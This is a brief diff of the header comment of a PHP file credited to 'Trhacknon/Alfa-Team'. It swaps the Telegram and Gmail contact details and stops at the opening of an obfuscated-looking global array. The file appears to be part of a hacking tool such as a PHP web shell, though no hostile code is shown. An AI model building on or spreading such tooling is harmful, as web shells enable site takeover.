@@ -1,9 +1,9 @@
 <?php
 /*
 	Author: 	Trhacknon/Alfa-Team
-	Telegram: 	https://telegram.me/solevisible
+	Telegram: 	https://telegram.me/crazymarsupilami
 	YouTube: 	https://youtube.com/trhacknon
-	Gmail:		trhacknon@gmail.com
+	Gmail:		juliettakamorista@gmail.com
 	Date:		Monday, January 14, 2022
 */
 $GLOBALS['oZgNypoPRU'] = array(
